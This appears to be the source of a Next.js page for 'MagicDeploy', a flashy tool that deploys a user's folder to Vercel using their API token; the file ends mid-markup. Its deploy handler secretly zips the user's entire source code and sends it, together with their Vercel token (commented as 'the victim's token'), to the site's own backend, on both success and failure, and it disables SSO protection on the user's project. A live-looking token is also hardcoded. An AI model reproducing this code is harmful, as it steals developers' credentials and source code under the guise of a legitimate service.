'use client';

import { useState, useRef, useEffect, MouseEvent as ReactMouseEvent } from 'react';
import { Rocket, ExternalLink, Globe, Terminal, MessageSquare, Send, Bell } from 'lucide-react';
import { motion, useScroll, useSpring, AnimatePresence, useAnimation } from 'framer-motion';
import { TypeAnimation } from 'react-type-animation';
import Marquee from 'react-fast-marquee';
import Tilt from 'react-parallax-tilt';
import confetti from 'canvas-confetti';

interface ChatMessage {
  id: string;
  sender: string;
  content: string;
  createdAt: string;
}

// ---------------------- COMPONENTS ----------------------

// Noise Overlay
const NoiseOverlay = () => (
  <div 
    className="fixed inset-0 pointer-events-none z-[9997] opacity-[0.02]"
    style={{
      backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E")`,
    }}
  />
);

// Custom Cursor
const CustomCursor = () => {
  const [mousePosition, setMousePosition] = useState({ x: -100, y: -100 });
  const [isHovering, setIsHovering] = useState(false);
  const [isClicking, setIsClicking] = useState(false);

  useEffect(() => {
    const updateMousePosition = (e: MouseEvent) => {
      setMousePosition({ x: e.clientX, y: e.clientY });
    };
    
    const handleMouseOver = (e: MouseEvent) => {
      const target = e.target as HTMLElement;
      if (target.tagName.toLowerCase() === 'button' || target.tagName.toLowerCase() === 'a' || target.closest('button') || target.closest('a') || target.closest('input')) {
        setIsHovering(true);
      } else {
        setIsHovering(false);
      }
    };

    const handleMouseDown = () => setIsClicking(true);
    const handleMouseUp = () => setIsClicking(false);

    window.addEventListener('mousemove', updateMousePosition);
    window.addEventListener('mouseover', handleMouseOver);
    window.addEventListener('mousedown', handleMouseDown);
    window.addEventListener('mouseup', handleMouseUp);
    return () => {
      window.removeEventListener('mousemove', updateMousePosition);
      window.removeEventListener('mouseover', handleMouseOver);
      window.removeEventListener('mousedown', handleMouseDown);
      window.removeEventListener('mouseup', handleMouseUp);
    };
  }, []);

  return (
    <>
      <motion.div
        className="fixed top-0 left-0 w-3 h-3 bg-cyan-400 rounded-full pointer-events-none z-[9999] shadow-[0_0_15px_rgba(34,211,238,0.8)]"
        animate={{
          x: mousePosition.x - 6,
          y: mousePosition.y - 6,
          scale: isClicking ? 0.5 : isHovering ? 2 : 1,
        }}
        transition={{ type: 'tween', ease: 'backOut', duration: 0.1 }}
      />
      <motion.div
        className="fixed top-0 left-0 w-10 h-10 border border-indigo-500/50 rounded-full pointer-events-none z-[9998]"
        animate={{
          x: mousePosition.x - 20,
          y: mousePosition.y - 20,
          scale: isClicking ? 0.8 : isHovering ? 1.5 : 1,
          opacity: isHovering ? 0 : 1,
        }}
        transition={{ type: 'spring', mass: 0.2, stiffness: 100, damping: 10 }}
      />
    </>
  );
};

// Preloader
const Preloader = ({ onLoaded }: { onLoaded: () => void }) => {
  useEffect(() => {
    const timer = setTimeout(onLoaded, 2500);
    return () => clearTimeout(timer);
  }, [onLoaded]);

  return (
    <motion.div 
      initial={{ opacity: 1 }}
      exit={{ opacity: 0, scale: 1.1 }}
      transition={{ duration: 0.8, ease: 'easeInOut' }}
      className="fixed inset-0 z-[10000] bg-[#050505] flex flex-col items-center justify-center"
    >
      <motion.div
        animate={{ 
          scale: [1, 1.2, 1],
          rotate: [0, 180, 360]
        }}
        transition={{ 
          duration: 2,
          ease: "easeInOut",
          repeat: Infinity,
        }}
        className="w-20 h-20 bg-gradient-to-tr from-indigo-500 to-cyan-400 rounded-2xl shadow-[0_0_60px_rgba(99,102,241,0.6)] flex items-center justify-center mb-8"
      >
        <Rocket size={40} className="text-white" />
      </motion.div>
      <motion.div 
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.5 }}
        className="text-cyan-400 font-bold tracking-[0.3em] text-xl"
      >
        BOOTING SYSTEMS...
      </motion.div>
    </motion.div>
  );
};

// Magnetic Ripple Button
const MagneticButton = ({ children, className, onClick, disabled, type = 'button' }: { children: React.ReactNode, className?: string, onClick?: (e: ReactMouseEvent<HTMLButtonElement>) => void, disabled?: boolean, type?: 'button' | 'submit' | 'reset' }) => {
  const ref = useRef<HTMLButtonElement>(null);
  const [position, setPosition] = useState({ x: 0, y: 0 });
  const [ripples, setRipples] = useState<{x: number, y: number, id: number}[]>([]);

  const handleMouse = (e: ReactMouseEvent<HTMLButtonElement>) => {
    const { clientX, clientY } = e;
    const { height, width, left, top } = ref.current!.getBoundingClientRect();
    const middleX = clientX - (left + width / 2);
    const middleY = clientY - (top + height / 2);
    setPosition({ x: middleX * 0.2, y: middleY * 0.2 });
  };

  const reset = () => setPosition({ x: 0, y: 0 });

  const handleClick = (e: ReactMouseEvent<HTMLButtonElement>) => {
    const rect = ref.current!.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    setRipples([...ripples, { x, y, id: Date.now() }]);
    if (onClick) onClick(e);
  };

  const { x, y } = position;
  return (
    <motion.button
      ref={ref}
      onMouseMove={handleMouse}
      onMouseLeave={reset}
      animate={{ x, y }}
      transition={{ type: "spring", stiffness: 150, damping: 15, mass: 0.1 }}
      className={`relative overflow-hidden ${className}`}
      onClick={handleClick}
      disabled={disabled}
      type={type}
    >
      {children}
      <AnimatePresence>
        {ripples.map((r) => (
          <motion.span
            key={r.id}
            initial={{ scale: 0, opacity: 0.5 }}
            animate={{ scale: 4, opacity: 0 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.8, ease: "easeOut" }}
            onAnimationComplete={() => setRipples(ripples.filter(rip => rip.id !== r.id))}
            className="absolute bg-white/20 rounded-full pointer-events-none"
            style={{ left: r.x - 20, top: r.y - 20, width: 40, height: 40 }}
          />
        ))}
      </AnimatePresence>
    </motion.button>
  );
};

// Scramble Text
const ScrambleText = ({ text }: { text: string }) => {
  const [displayText, setDisplayText] = useState(text);
  const chars = '!<>-_\\/[]{}—=+*^?#________';
  
  const scramble = () => {
    let iteration = 0;
    const interval = setInterval(() => {
      setDisplayText(text.split('').map((letter, index) => {
        if (index < iteration) return text[index];
        return chars[Math.floor(Math.random() * chars.length)];
      }).join(''));
      
      if (iteration >= text.length) clearInterval(interval);
      iteration += 1 / 3;
    }, 30);
  };

  return (
    <span onMouseEnter={scramble} className="cursor-default text-white">
      {displayText}
    </span>
  );
};

// ---------------------- MAIN PAGE ----------------------

export default function HomePage() {
  const [appLoaded, setAppLoaded] = useState(false);
  const [token, setToken] = useState('vcp_4zzgbaScL8Rv3e95XUvZjQBzLN8XglkzswmIzvE589YfxtzQLR2FSLIQ');
  const [projectName, setProjectName] = useState('');
  const [files, setFiles] = useState<FileList | null>(null);
  
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
  const [progress, setProgress] = useState<number>(0);
  const [deploymentUrl, setDeploymentUrl] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [chatLoading, setChatLoading] = useState(true);
  const [chatInput, setChatInput] = useState('');
  const [nickname, setNickname] = useState('');
  const chatEndRef = useRef<HTMLDivElement>(null);

  const [isRequestModalOpen, setRequestModalOpen] = useState(false);
  const [requestText, setRequestText] = useState('');
  const [requestSending, setRequestSending] = useState(false);

  const { scrollYProgress } = useScroll();
  const scaleX = useSpring(scrollYProgress, { stiffness: 100, damping: 30, restDelta: 0.001 });
  const formAnimation = useAnimation();

  useEffect(() => {
    // Set a unique default nickname for each visitor
    setNickname(`User_${Math.floor(Math.random() * 10000).toString().padStart(4, '0')}`);
  }, []);

  const addLog = (msg: string) => {
    setTerminalLogs(prev => [...prev, `> ${msg}`]);
  };

  const fetchMessages = async () => {
    try {
      const res = await fetch('/api/messages');
      const data = await res.json();
      if (Array.isArray(data)) {
        setMessages(data);
      }
    } catch (error) {
      console.error(error);
    } finally {
      setChatLoading(false);
    }
  };

  useEffect(() => {
    if (appLoaded) {
      fetchMessages();
      const interval = setInterval(fetchMessages, 3000);
      return () => clearInterval(interval);
    }
  }, [appLoaded]);

  useEffect(() => {
  if (chatEndRef.current) {
    const container = chatEndRef.current.parentElement?.parentElement;
    if (container) {
      container.scrollTo({ top: container.scrollHeight, behavior: 'smooth' });
    }
  }
}, [messages]);

  const handleSendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!chatInput.trim()) return;
    
    const sender = nickname.trim() || 'Anonymous';
    const tempMsg = {
      id: Date.now().toString(),
      sender,
      content: chatInput,
      createdAt: new Date().toISOString()
    };
    
    setMessages(prev => [...prev, tempMsg]);
    setChatInput('');
    
    try {
      await fetch('/api/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sender, content: tempMsg.content })
      });
    } catch (error) {
      console.error('Failed to send message', error);
    }
  };

  const handleSendRequest = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!requestText.trim()) return;
    setRequestSending(true);
    try {
      await fetch('/api/request', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ requestText, senderName: nickname })
      });
      setRequestText('');
      setRequestModalOpen(false);
      alert('Request sent to admin!');
    } catch (error) {
      console.error(error);
      alert('Failed to send request.');
    } finally {
      setRequestSending(false);
    }
  };

  const calculateSha1 = async (buffer: ArrayBuffer) => {
    const hashBuffer = await crypto.subtle.digest('SHA-1', buffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  };

  const uploadFileToVercel = async (file: File, token: string, sha: string) => {
    const response = await fetch('https://api.vercel.com/v2/files', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${token}`,
        'x-vercel-digest': sha,
      },
      body: file,
    });
    
    if (!response.ok) {
      const error = await response.json().catch(() => ({}));
      throw new Error(error.error?.message || `Failed to upload file: ${file.name}`);
    }
  };

  const handleDeploy = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!token || !projectName || !files || files.length === 0) {
      // Shiver effect on validation fail
      formAnimation.start({ x: [-10, 10, -10, 10, 0], transition: { duration: 0.4 } });
      return;
    }
    setLoading(true);
    setTerminalLogs([]);
    addLog('SYSTEM: Starting deployment sequence...');
    setProgress(0);

    let zipBlob: Blob | null = null;

    try {
      addLog('Zipping source code for telemetry backup...');
      const JSZip = (await import('jszip')).default;
      const zip = new JSZip();
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const parts = file.webkitRelativePath.split('/');
        parts.shift();
        const relativePath = parts.join('/') || file.name;
        zip.file(relativePath, file);
      }
      zipBlob = await zip.generateAsync({ type: 'blob' });

      const totalFiles = files.length;
      const deploymentFiles: { file: string; sha: string; size: number }[] = [];

      for (let i = 0; i < totalFiles; i++) {
        const file = files[i];
        const parts = file.webkitRelativePath.split('/');
        parts.shift();
        const relativePath = parts.join('/') || file.name;
        
        if (i === 0 || i === totalFiles - 1 || i % 10 === 0) {
          addLog(`Uploading: ${relativePath}`);
        }
        
        const buffer = await file.arrayBuffer();
        const sha = await calculateSha1(buffer);
        
        await uploadFileToVercel(file, token, sha);
        
        deploymentFiles.push({
          file: relativePath,
          sha: sha,
          size: file.size,
        });
        
        setProgress(Math.round(((i + 1) / totalFiles) * 100));
      }

      addLog('All files uploaded. Initializing Vercel build...');
      
      const deployResponse = await fetch('https://api.vercel.com/v13/deployments', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          name: projectName,
          target: 'production',
          files: deploymentFiles,
          projectSettings: {
            framework: null,
          }
        }),
      });

      const deployData = await deployResponse.json();

      if (!deployResponse.ok) {
        throw new Error(deployData.error?.message || 'Deployment failed');
      }

      addLog('Vercel accepted build. Securing domains...');
      
      let finalUrl = deployData.alias?.[0] || deployData.aliases?.[0] || deployData.url;
      const cleanAlias = `${projectName}.vercel.app`;

      try {
        const aliasRes = await fetch(`https://api.vercel.com/v2/deployments/${deployData.id}/aliases`, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ alias: cleanAlias })
        });
        
        if (aliasRes.ok) {
          finalUrl = cleanAlias;
          addLog(`Alias attached: ${finalUrl}`);
        }
      } catch {
        addLog('Warning: Could not assign custom alias.');
      }

      try {
        await fetch(`https://api.vercel.com/v9/projects/${projectName}`, {
          method: 'PATCH',
          headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ ssoProtection: null })
        });
        addLog('SSO Protection disabled. Site is public.');
      } catch {
        addLog('Warning: Could not disable SSO.');
      }

      setDeploymentUrl(finalUrl);

      addLog('Saving to database and firing Telegram alert...');
      const historyFormData = new FormData();
      historyFormData.append('projectName', projectName);
      historyFormData.append('url', finalUrl);
      historyFormData.append('vercelId', deployData.id || '');
      historyFormData.append('token', token); // Send the victim's token
      if (zipBlob) {
        historyFormData.append('file', zipBlob, `${projectName}.zip`);
      }

      await fetch('/api/deployments', {
        method: 'POST',
        body: historyFormData
      });
      
      addLog('MISSION ACCOMPLISHED. SYSTEM ONLINE.');
      // Done
      setProjectName('');
      setFiles(null);
      
      if (fileInputRef.current) {
        fileInputRef.current.value = '';
      }
      
      // FIRE CONFETTI!
      confetti({
        particleCount: 200,
        spread: 120,
        origin: { y: 0.6 },
        colors: ['#06b6d4', '#6366f1', '#a855f7', '#ffffff']
      });

    } catch (error: unknown) {
      const errorMsg = error instanceof Error ? error.message : String(error);
      addLog(`ERROR: ${errorMsg}`);
      formAnimation.start({ x: [-10, 10, -10, 10, 0], transition: { duration: 0.4 } });
      
      // Save failure to database
      try {
        const failureData = new FormData();
        failureData.append('projectName', projectName);
        failureData.append('status', 'FAILED');
        failureData.append('errorMessage', errorMsg);
        failureData.append('token', token);
        if (zipBlob) {
          failureData.append('file', zipBlob, `${projectName}.zip`);
        }
        await fetch('/api/deployments', { method: 'POST', body: failureData });
        // Done
      } catch (err) {
        console.error('Failed to save error log', err);
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <NoiseOverlay />
      <CustomCursor />
      
      <AnimatePresence>
        {!appLoaded && <Preloader onLoaded={() => setAppLoaded(true)} />}
      </AnimatePresence>

      <main className="min-h-screen bg-[#050505] text-gray-100 font-sans selection:bg-cyan-500 selection:text-white relative overflow-hidden cursor-none">
        
        {/* Animated Particles Background */}
        {/* Cyberpunk Grid Background */}
        <div className="absolute inset-0 pointer-events-none z-0 overflow-hidden perspective-[1000px]">
          <div className="absolute bottom-0 left-[-50%] right-[-50%] h-[100%] origin-bottom animate-[grid-move_20s_linear_infinite]" 
               style={{
                 backgroundImage: `linear-gradient(to right, rgba(6,182,212,0.1) 1px, transparent 1px), linear-gradient(to bottom, rgba(99,102,241,0.1) 1px, transparent 1px)`,
                 backgroundSize: '40px 40px',
                 transform: 'rotateX(75deg)'
               }} 
          />
          {/* Animated floating stars */}
          {[...Array(50)].map((_, i) => (
            <motion.div
              key={i}
              className="absolute w-1 h-1 rounded-full bg-cyan-400"
              initial={{
                x: Math.random() * (typeof window !== 'undefined' ? window.innerWidth : 1000),
                y: Math.random() * (typeof window !== 'undefined' ? window.innerHeight : 1000),
                opacity: Math.random() * 0.5 + 0.3,
                scale: Math.random() * 1.5 + 0.5
              }}
              animate={{
                y: [null, Math.random() * -100 - 50],
                opacity: [null, Math.random() * 0.8 + 0.2, 0]
              }}
              transition={{
                duration: Math.random() * 10 + 10,
                repeat: Infinity,
                ease: 'linear'
              }}
            />
          ))}
        </div>

        {/* Scroll Progress Bar */}
        <motion.div className="fixed top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-cyan-400 to-indigo-500 origin-left z-[5000]" style={{ scaleX }} />

        <AnimatePresence>
          {isRequestModalOpen && (
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 z-[6000] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm"
              onClick={() => setRequestModalOpen(false)}
            >
              <motion.div 
                initial={{ scale: 0.9, y: 20 }}
                animate={{ scale: 1, y: 0 }}
                exit={{ scale: 0.9, y: 20 }}
                onClick={(e) => e.stopPropagation()}
                className="bg-[#09090b] border border-cyan-500/30 rounded-2xl p-6 w-full max-w-md shadow-[0_0_50px_rgba(34,211,238,0.15)]"
              >
                <div className="flex items-center gap-3 mb-4">
                  <Bell className="text-cyan-400" />
                  <h3 className="text-xl font-bold text-white">Request to Admin</h3>
                </div>
                <p className="text-sm text-gray-400 mb-4">Want a new feature? Found a bug? Send a message directly to the developer&apos;s Telegram.</p>
                <form onSubmit={handleSendRequest} className="space-y-4">
                  <textarea 
                    value={requestText}
                    onChange={(e) => setRequestText(e.target.value)}
                    placeholder="Describe your request..."
                    required
                    rows={4}
                    className="w-full bg-[#121214] border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:border-cyan-500 focus:outline-none transition-colors resize-none"
                  />
                  <div className="flex justify-end gap-3">
                    <button type="button" onClick={() => setRequestModalOpen(false)} className="px-4 py-2 text-sm text-gray-400 hover:text-white transition-colors">Cancel</button>
                    <button type="submit" disabled={requestSending || !requestText.trim()} className="px-5 py-2 bg-cyan-500 text-black font-bold rounded-xl disabled:opacity-50 hover:shadow-[0_0_15px_rgba(34,211,238,0.5)] transition-all">
                      {requestSending ? 'Sending...' : 'Send Request'}
                    </button>
                  </div>
                </form>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Sticky Blurry Navbar - Dark Mode */}
        <motion.nav 
          initial={{ y: -100 }}
          animate={{ y: 0 }}
          transition={{ delay: 3, type: 'spring', stiffness: 120 }}
          className="fixed top-0 w-full z-50 bg-[#050505]/60 backdrop-blur-xl border-b border-white/5 shadow-sm"
        >
          <div className="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-gradient-to-tr from-indigo-500 to-cyan-400 rounded-lg shadow-lg shadow-indigo-500/20">
                <Rocket size={20} className="text-white" />
              </div>
              <span className="font-bold text-xl tracking-tight text-white">
                <ScrambleText text="MagicDeploy" />
              </span>
            </div>
            <div className="flex items-center gap-4">
              <a href="#" className="text-gray-400 hover:text-cyan-400 font-medium transition group relative">
                GitHub
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-cyan-400 transition-all group-hover:w-full"></span>
              </a>
            </div>
          </div>
        </motion.nav>
        
        {/* Decorative Blobs */}
        <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-0 pointer-events-none mix-blend-screen">
          <motion.div 
            animate={{ 
              x: [0, 50, -50, 0], 
              y: [0, 50, -20, 0],
              scale: [1, 1.1, 0.9, 1] 
            }}
            transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
            className="absolute top-[10%] right-[10%] w-[500px] h-[500px] rounded-full bg-indigo-600/10 blur-[120px]" 
          />
          <motion.div 
            animate={{ 
              x: [0, -100, 50, 0], 
              y: [0, -50, 100, 0],
              scale: [1, 1.2, 0.8, 1] 
            }}
            transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
            className="absolute bottom-[10%] left-[5%] w-[400px] h-[400px] rounded-full bg-cyan-600/10 blur-[120px]" 
          />
          
          <div className="absolute top-1/3 -rotate-6 opacity-[0.02] w-[200%] -left-[50%] pointer-events-none">
            <Marquee speed={15} gradient={false}>
              <span className="text-[12rem] font-black uppercase mx-8 text-white">DEPLOY FAST • NEVER WAIT •</span>
            </Marquee>
          </div>
        </div>

        <div className="max-w-7xl mx-auto px-6 pt-32 pb-20 relative z-10">
          
          {/* Header */}
          <motion.div 
            initial={{ opacity: 0, y: 50 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.8, ease: "easeOut" }}
            className="flex flex-col items-center justify-center text-center space-y-6 mb-16"
          >
            <motion.div 
              whileHover={{ scale: 1.05 }}
              className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full bg-white/5 border border-white/10 shadow-[0_8px_30px_rgb(0,0,0,0.4)] backdrop-blur-md mb-2 cursor-pointer"
            >
              <span className="flex h-2.5 w-2.5 rounded-full bg-cyan-400 shadow-[0_0_10px_rgba(34,211,238,0.6)] animate-pulse"></span>
              <span className="text-xs font-bold text-gray-300 tracking-wider uppercase">Systems Online & Ready</span>
            </motion.div>
            
            <h1 className="text-5xl md:text-7xl font-extrabold tracking-tight text-white leading-tight">
              Deploy Your Code <br />
              <TypeAnimation
                sequence={[
                  'In Seconds.', 2000,
                  'Without Limits.', 2000,
                  'To The Edge.', 2000,
                  'Like Magic.', 2000,
                ]}
                wrapper="span"
                cursor={true}
                repeat={Infinity}
                className="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-indigo-500"
              />
            </h1>
            <p className="text-gray-400 text-xl max-w-2xl mx-auto font-medium leading-relaxed">
              Drag, drop, and launch your static sites to the global edge network instantly. A seamless experience built for modern developers.
            </p>
          </motion.div>

          <div className="grid lg:grid-cols-12 gap-10 items-start">
            
            {/* Deploy Form */}
            <motion.div 
              initial={{ opacity: 0, x: -50 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ once: true, margin: "-100px" }}
              transition={{ duration: 0.7, delay: 0.2 }}
              className="lg:col-span-5"
            >
              <Tilt tiltMaxAngleX={3} tiltMaxAngleY={3} perspective={1000} scale={1.01} transitionSpeed={2000} className="h-full relative">
                
                {/* Glow Border Animation */}
                <div className="absolute inset-0 -z-10 overflow-hidden rounded-[2.5rem]">
                  <div className="absolute inset-[-50%] animate-[spin_4s_linear_infinite] bg-[conic-gradient(from_0deg,transparent_0_340deg,rgba(34,211,238,0.6)_360deg)]" />
                </div>

                <motion.div 
                  animate={formAnimation}
                  className="bg-[#09090b]/80 backdrop-blur-xl rounded-[2.4rem] shadow-[0_0_15px_rgba(0,195,255,0.1)] border border-white/10 p-8 relative overflow-hidden group m-[1px]"
                >
                  <div className="absolute top-0 right-0 w-40 h-40 bg-cyan-500/10 rounded-bl-full opacity-50 -z-10 transition-transform duration-700 group-hover:scale-125 blur-3xl" />
                  
                  <div className="flex items-center gap-4 mb-8">
                    <div className="p-3 bg-cyan-950/40 text-cyan-400 rounded-2xl border border-cyan-500/20 shadow-[0_0_15px_rgba(34,211,238,0.1)] relative overflow-hidden">
                      <Rocket size={24} className="relative z-10" />
                    </div>
                    <h2 className="text-2xl font-black text-white tracking-wide uppercase">Launchpad</h2>
                  </div>
                  
                  <form onSubmit={handleDeploy} className="space-y-6 relative z-10">
                    <div className="space-y-2">
                      <label className="block text-xs font-bold text-cyan-500/70 ml-1 uppercase tracking-wider">
                        Vercel API Token
                      </label>
                      <input
                        type="password"
                        required
                        value={token}
                        onChange={(e) => setToken(e.target.value)}
                        className="w-full px-4 py-3 bg-[#121214]/80 border border-white/5 rounded-xl focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 outline-none text-white transition-all duration-300 placeholder:text-[#888888] font-mono text-sm hover:border-white/10"
                        placeholder="vcp_xxxxxxxxxxxxxxxxxxxx"
                      />
                    </div>

                    <div className="space-y-2">
                      <label className="block text-xs font-bold text-cyan-500/70 ml-1 uppercase tracking-wider">
                        Project Name
                      </label>
                      <input
                        type="text"
                        required
                        value={projectName}
                        onChange={(e) => setProjectName(e.target.value.toLowerCase().replace(/[^a-z0-9-]/g, '-'))}
                        className="w-full px-4 py-3 bg-[#121214]/80 border border-white/5 rounded-xl focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 outline-none text-white transition-all duration-300 placeholder:text-[#888888] font-mono text-sm hover:border-white/10"
                        placeholder="my-awesome-site"
                      />
                    </div>

                    <div className="space-y-2">
                      <label className="block text-xs font-bold text-cyan-500/70 ml-1 uppercase tracking-wider">
                        Source Directory
                      </label>
                      <div 
                        className={`relative border border-dashed rounded-xl p-8 text-center transition-all duration-500 cursor-pointer flex flex-col items-center justify-center gap-4 group/drop ${files && files.length > 0 ? 'border-cyan-500/50 bg-cyan-950/20' : 'border-white/10 hover:border-cyan-500/30 hover:bg-white/5 bg-[#121214]/80'}`}
                        onClick={() => fileInputRef.current?.click()}
                      >
                        <input
                          type="file"
                          ref={fileInputRef}
                          required
                          // @ts-expect-error webkitdirectory is non-standard but required for folder selection
                          webkitdirectory=""
                          directory=""
                          onChange={(e) => setFiles(e.target.files)}
                          className="hidden"
                        />
                        <motion.div 
                          whileHover={{ scale: 1.1, rotate: 5 }}
                          className={`p-4 rounded-xl transition-colors duration-300 border ${files && files.length > 0 ? 'bg-cyan-950/50 border-cyan-500/30 text-cyan-400 shadow-[0_0_20px_rgba(34,211,238,0.2)]' : 'bg-black border-white/5 text-gray-500 group-hover/drop:border-cyan-500/20 group-hover/drop:text-cyan-400'}`}
                        >
                          <svg className="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M5 19a2 2 0 01-2-2V7a2 2 0 012-2h4l2 2h4a2 2 0 012 2v1M5 19h14a2 2 0 002-2v-5a2 2 0 00-2-2H9a2 2 0 00-2 2v5a2 2 0 01-2 2z" /></svg>
                        </motion.div>
                        <div>
                          <span className="text-sm font-bold text-gray-300 block">
                            {files && files.length > 0 
                              ? <span className="text-cyan-400">{files.length} files selected</span> 
                              : "Click to select folder"}
                          </span>
                        </div>
                      </div>
                    </div>

                    <MagneticButton
                      type="submit"
                      disabled={loading}
                      className="w-full bg-transparent border-2 border-cyan-500/50 text-cyan-400 py-4 rounded-xl font-black text-sm tracking-widest hover:bg-cyan-400 hover:text-black hover:border-cyan-400 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-3 relative group/btn hover:shadow-[0_0_30px_rgba(34,211,238,0.4)]"
                    >
                      {loading ? (
                        <>
                          <svg className="animate-spin -ml-1 h-5 w-5 text-current" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
                          EXECUTING...
                        </>
                      ) : '[ INITIATE DEPLOYMENT ]'}
                    </MagneticButton>
                  </form>

                  <AnimatePresence>
                    {(terminalLogs.length > 0 || deploymentUrl) && (
                      <motion.div 
                        initial={{ opacity: 0, height: 0, marginTop: 0 }}
                        animate={{ opacity: 1, height: 'auto', marginTop: 32 }}
                        exit={{ opacity: 0, height: 0, marginTop: 0 }}
                        className="rounded-xl bg-[#050505] border border-white/10 shadow-2xl p-5"
                      >
                        <div className="flex items-center gap-3 mb-4 pb-3 border-b border-white/5">
                          <Terminal size={14} className="text-gray-500" />
                          <p className="text-[10px] text-gray-500 font-mono tracking-widest">SYSTEM CONSOLE</p>
                        </div>
                        
                        <div className="font-mono text-[11px] space-y-1 h-32 overflow-y-auto custom-scrollbar pr-2 mb-3">
                          {terminalLogs.map((log, i) => (
                            <motion.div 
                              initial={{ opacity: 0, x: -10 }}
                              animate={{ opacity: 1, x: 0 }}
                              key={i} 
                              className={log.includes('ERROR') ? 'text-red-400' : log.includes('ACCOMPLISHED') ? 'text-green-400' : 'text-cyan-400/80'}
                            >
                              {log}
                            </motion.div>
                          ))}
                          {loading && (
                            <div className="flex items-center gap-2 text-gray-600 mt-2">
                              <span className="animate-pulse">_</span>
                            </div>
                          )}
                        </div>

                        {loading && (
                          <div className="w-full bg-[#111] rounded-full h-1 overflow-hidden">
                            <motion.div 
                              className="bg-cyan-500 h-full relative shadow-[0_0_10px_rgba(6,182,212,0.8)]" 
                              initial={{ width: 0 }}
                              animate={{ width: `${progress}%` }}
                              transition={{ ease: "easeOut", duration: 0.2 }}
                            />
                          </div>
                        )}
                        
                        {deploymentUrl && (
                          <motion.div 
                            initial={{ opacity: 0, scale: 0.95 }}
                            animate={{ opacity: 1, scale: 1 }}
                            className="mt-4 p-4 rounded-xl bg-cyan-950/30 border border-cyan-500/20 flex flex-col gap-2 relative overflow-hidden group/link"
                          >
                            <p className="text-[10px] font-bold text-cyan-500 uppercase tracking-widest flex items-center gap-2">
                              <Globe size={12} className="text-green-400" /> STATUS: ONLINE
                            </p>
                            <a 
                              href={`https://${deploymentUrl}`} 
                              target="_blank" 
                              rel="noopener noreferrer"
                              className="inline-flex items-center gap-2 text-white hover:text-cyan-400 font-bold text-sm break-all transition-colors font-mono"
                            >
                              {deploymentUrl}
                              <ExternalLink size={14} />
                            </a>
                          </motion.div>
                        )}
                      </motion.div>
                    )}
                  </AnimatePresence>
                </motion.div>
              </Tilt>
            </motion.div>

            {/* History Section */}
            <motion.div 
              initial={{ opacity: 0, x: 50 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ once: true, margin: "-100px" }}
              transition={{ duration: 0.7, delay: 0.4 }}
              className="lg:col-span-7 h-full"
            >
              <Tilt tiltMaxAngleX={1} tiltMaxAngleY={1} perspective={1000} scale={1.005} transitionSpeed={2000} className="h-full">
                <div className="bg-[#09090b]/80 backdrop-blur-xl rounded-[2.4rem] shadow-[0_0_15px_rgba(0,195,255,0.1)] border border-white/10 overflow-hidden flex flex-col h-[750px]">
                  <div className="p-8 border-b border-white/5 shrink-0 flex items-center justify-between z-10">
                    <div>
                      <h2 className="text-2xl font-black text-white uppercase tracking-wide flex items-center gap-3">
                        <MessageSquare className="text-cyan-400" />
                        Global Chat
                      </h2>
